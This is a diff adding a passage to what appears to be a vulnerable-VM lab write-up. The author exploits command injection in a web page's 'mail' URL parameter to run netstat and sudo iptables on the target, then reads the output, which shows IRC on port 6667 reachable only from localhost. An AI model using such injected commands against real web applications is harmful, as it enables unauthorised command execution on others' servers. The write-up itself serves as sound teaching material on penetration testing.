@@ -155,3 +155,39 @@ And while IRC is back, it now has an accompanying bot:
 
 *  `ircd:x:1003:1003:,,,:/home/ircd:/bin/bash`
 *  `sopel:x:110:118:Sopel IRC bot,,,:/var/lib/sopel:/bin/false`
+
+But what is it listening on? I didn't see it on `nmap` earlier.
+
+http://192.168.x.x:60080/?page=mailer&mail=netstat%20-tapln
+
+```
+Active Internet connections (servers and established) 
+Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
+tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - 
+tcp 0 0 0.0.0.0:6667 0.0.0.0:* LISTEN - 
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
+tcp 0 0 127.0.0.1:43712 127.0.0.1:6667 ESTABLISHED - 
+tcp 0 0 127.0.0.1:6667 127.0.0.1:43712 ESTABLISHED - 
+tcp 0 0 127.0.0.1:6667 127.0.0.1:43708 ESTABLISHED - 
+tcp 0 0 127.0.0.1:6667 127.0.0.1:43706 ESTABLISHED - 
+tcp 0 0 127.0.0.1:43706 127.0.0.1:6667 ESTABLISHED - 
+tcp 0 0 127.0.0.1:43708 127.0.0.1:6667 ESTABLISHED - 
+tcp6 0 0 :::60080 :::* LISTEN - 
+tcp6 0 0 :::22 :::* LISTEN - 
+```
+
+Hm, what's that on 6667? Time to find out.
+
+http://192.168.x.x:60080/?page=mailer&mail=sudo%20iptables%20-nvL
+
+```
+Chain INPUT (policy ACCEPT 289K packets, 16M bytes) pkts bytes target prot opt in out source destination 
+1001 64129 ACCEPT tcp -- * * 127.0.0.1 0.0.0.0/0 tcp dpt:6667 
+19 948 DROP tcp -- * * 0.0.0.0/0 0.0.0.0/0 tcp dpt:6667 
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 
+
+Chain OUTPUT (policy ACCEPT 292K packets, 24M bytes) pkts bytes target prot opt in out source destination
+```
+
+`iptables` is dropping all connections except those performed from inside the server. So now I have to get in the server. 
